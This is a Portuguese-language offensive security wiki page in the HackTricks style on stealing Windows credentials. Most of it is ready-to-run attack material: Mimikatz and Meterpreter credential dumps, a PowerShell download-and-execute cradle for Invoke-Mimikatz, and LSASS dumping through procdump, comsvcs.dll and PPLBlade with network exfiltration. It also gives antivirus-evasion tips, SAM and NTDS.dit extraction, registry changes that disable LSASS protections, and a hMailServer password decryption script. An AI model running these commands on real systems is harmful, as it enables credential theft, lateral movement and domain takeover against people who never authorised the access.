# Roubo de Credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras coisas que o Mimikatz pode fazer em** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba mais sobre algumas possíveis proteções de credentials aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credentials.**

## Credentials com Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar passwords and hashes** no sistema da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contornando AV

### Procdump + Mimikatz

Como **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
Você pode usar esta ferramenta para **dump do processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.

Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Esse processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe para fazer dump de lsass.exe**, isso ocorre porque eles estão **detectando** a string **"procdump.exe" and "lsass.exe"**. Portanto é mais **furtivo** **passar** como **argumento** o **PID** de lsass.exe para procdump **em vez do** **nome lsass.exe.**

### Fazendo dump de lsass com **comsvcs.dll**

A DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **fazer dump da memória do processo** no evento de um crash. Essa DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\  
É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O **PID** do processo a ser feito dump constitui o primeiro componente, o local do arquivo de dump representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\  
Ao analisar esses três componentes, a DLL passa a criar o arquivo de dump e a transferir a memória do processo especificado para esse arquivo.\  
A utilização de **comsvcs.dll** é viável para fazer dump do processo lsass, eliminando assim a necessidade de enviar e executar procdump. Esse método está descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

O comando a seguir é utilizado para a execução:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar este processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Despejando lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito na barra de tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Local Security Authority Process" na aba Processes
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Create dump file".

### Despejando lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte da suíte [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma Protected Process Dumper Tool que suporta obfuscating memory dump e transferi-lo para remote workstations sem gravá-lo no disco.

**Funcionalidades chave**:

1. Bypassing PPL protection
2. Obfuscating memory dump files para evadir os mecanismos de detecção baseados em assinatura do Defender
3. Uploading memory dump com os métodos de upload RAW e SMB sem gravá-lo no disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon envia um dumper de três estágios chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, então hooks de EDR nessa API nunca disparam:

1. **Stage 1 loader (`lals.exe`)** – procura em `fdp.dll` por um placeholder composto por 32 caracteres `d` minúsculos, sobrescreve-o com o caminho absoluto para `rtu.txt`, salva a DLL patchada como `nfdp.dll` e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força o **LSASS** a carregar a DLL maliciosa como um novo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando o LSASS carrega `nfdp.dll`, a DLL lê `rtu.txt`, XORa cada byte com `0x20` e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Stage 3 dumper** – o payload mapeado reimplementa a lógica do MiniDump usando **direct syscalls** resolvidos a partir de nomes de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Um export dedicado chamado `Tom` abre `%TEMP%\<pid>.ddt`, streama um dump compactado do LSASS para o arquivo e fecha o handle para que a exfiltração possa ocorrer depois.

Notas do operador:

* Mantenha `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` no mesmo diretório. O Stage 1 reescreve o placeholder codificado com o caminho absoluto para `rtu.txt`, então separá-los quebra a cadeia.
* O registro acontece ao acrescentar `nfdp` em `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Você pode definir esse valor você mesmo para fazer o LSASS recarregar o SSP a cada boot.
* Arquivos `%TEMP%\*.ddt` são dumps compactados. Descomprima localmente e depois alimente-os no Mimikatz/Volatility para extração de credenciais.
* Executar `lals.exe` requer privilégios admin/SeTcb para que `AddSecurityPackageA` tenha sucesso; uma vez que a chamada retorna, o LSASS carrega transparentemente o SSP malicioso e executa o Stage 2.
* Remover a DLL do disco não a expulsa do LSASS. Ou delete a entrada do registro e reinicie o LSASS (reboot) ou deixe-a para persistência de longo prazo.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extrair segredos do LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extrair o NTDS.dit do DC de destino
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump do histórico de senhas do NTDS.dit do DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar o atributo pwdLastSet para cada conta do NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM_. Mas **você não pode simplesmente copiá‑los de forma normal** porque eles são protegidos.

### Do Registro

A maneira mais fácil de extrair esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode copiar arquivos protegidos usando este serviço. É necessário ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas em versões do Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo com o **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (a unidade usada é "C:" e está salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, você também pode usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, contendo dados cruciais sobre objetos de usuário, grupos e suas associações. É onde os **password hashes** dos usuários de domínio são armazenados. Este arquivo é um banco de dados **Extensible Storage Engine (ESE)** e reside em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro deste banco de dados, três tabelas principais são mantidas:

- **Data Table**: Esta tabela é responsável por armazenar detalhes sobre objetos como usuários e grupos.
- **Link Table**: Registra relacionamentos, como associações de grupo.
- **SD Table**: Aqui são mantidos os **security descriptors** para cada objeto, garantindo a segurança e controle de acesso dos objetos armazenados.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows usa _Ntdsa.dll_ para interagir com esse arquivo e ele é usado por _lsass.exe_. Então, uma **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente, provavelmente por causa da melhoria de desempenho ao usar um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografar Password Encryption Key (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **cada controlador de domínio**, mas ele é **cifrado** dentro do arquivo **NTDS.dit** usando o **BOOTKEY** do arquivo **SYSTEM** do controlador de domínio (é diferente entre controladores de domínio). É por isso que, para obter as credenciais do arquivo NTDS.dit **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o [**volume shadow copy**](#stealing-sam-and-system) trick para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do **arquivo SYSTEM** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Extraindo hashes do NTDS.dit**

Uma vez que você tenha **obtido** os arquivos **NTDS.dit** e **SYSTEM** você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extraí-los automaticamente** usando um usuário domain admin válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **grandes arquivos NTDS.dit** recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Os objetos do NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também os próprios objetos e seus atributos para posterior extração de informações quando o arquivo bruto NTDS.dit já foi obtido.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (NT & LM hashes, supplemental credentials como cleartext passwords, kerberos ou trust keys, NT & LM password histories). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e de máquina com os respectivos hashes, flags UAC, carimbo de data/hora do último logon e da alteração de senha, descrição das contas, nomes, UPN, SPN, grupos e membros recursivos, árvore de unidades organizacionais e filiação, domínios confiáveis com tipo de trusts, direção e atributos...

## Lazagne

Faça o download do binário em [here](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar esse binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e do LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrai credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint`, e o timestamp da última gravação. Você pode replicar a lógica do FinalDraft com PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` para os Event IDs **21** (logon bem-sucedido) e **25** (desconexão) para mapear quem administrou a máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Depois de saber qual Domain Admin se conecta regularmente, faça dump do LSASS (com LalsDumper/Mimikatz) enquanto a sessão **desconectada** ainda existir. CredSSP + NTLM fallback deixa o verificador e os tokens no LSASS, que então podem ser reaproveitados via SMB/WinRM para capturar `NTDS.dit` ou montar persistência em controladores de domínio.

### Registry downgrades targeted by FinalDraft

O mesmo implant também manipula várias chaves de registro para facilitar o roubo de credenciais:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Definir `DisableRestrictedAdmin=1` força a reutilização completa de credenciais/tickets durante o RDP, permitindo pivôs no estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desativa a filtragem de token do UAC, de modo que administradores locais recebem tokens sem restrições pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador DSRM faça logon enquanto o DC está online, dando aos atacantes outra conta integrada de alto privilégio.
* `RunAsPPL=0` remove as proteções PPL do LSASS, tornando o acesso à memória trivial para dumpers como LalsDumper.

## Credenciais do banco de dados do hMailServer (pós-comprometimento)

hMailServer armazena sua senha de DB em `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` sob `[Database] Password=`. O valor é criptografado com Blowfish usando a chave estática `THIS_KEY_IS_NOT_SECRET` e trocas de endianness de palavras de 4 bytes. Use a string hex do INI com o seguinte snippet Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Com a senha em texto claro, copie o banco de dados SQL CE para evitar bloqueios de arquivo, carregue o provedor de 32 bits e atualize, se necessário, antes de consultar os hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.
## LSA Logon Callback Interception (LsaApLogonUserEx2)

Some tooling captures **plaintext logon passwords** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **during logon** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.

Operational notes:
- Requires local admin/SYSTEM to load the helper in the authentication path.
- Captured credentials appear only when a logon occurs (interactive, RDP, service, or network logon depending on the hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stores saved connection information in a per-user `sqlstudio.bin` file. Dedicated dumpers can parse the file and recover saved SQL credentials. In shells that only return command output, the file is often exfiltrated by encoding it as Base64 and printing it to stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Do lado do operador, reconstrua o arquivo e execute o dumper localmente para recuperar credenciais:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Referências

- [Unit 42 – Uma investigação sobre anos de operações não detectadas direcionadas a setores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revelando a rede de retransmissão e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
